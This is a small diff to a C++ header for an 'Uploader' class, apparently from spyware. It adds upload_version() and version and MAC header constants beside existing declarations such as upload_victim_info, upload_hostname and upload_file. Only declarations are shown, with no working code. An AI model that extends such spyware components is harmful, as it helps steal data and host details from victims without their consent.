@@ -2,6 +2,8 @@
 #include "socket.h"
 
 #define SPY_UPL_HEADER_FILE	1
+#define SPY_UPL_HEADER_VER	2
+#define SPY_UPL_HEADER_MAC	3
 
 class Uploader 
 {
@@ -13,6 +15,7 @@ class Uploader
 	void upload_ipv4();
 	void upload_hostname();
 	void upload_victim_info();
+	void upload_version();
 	void upload_file_data(FILE * file);
 	void upload_file(FILE * file);
 public:
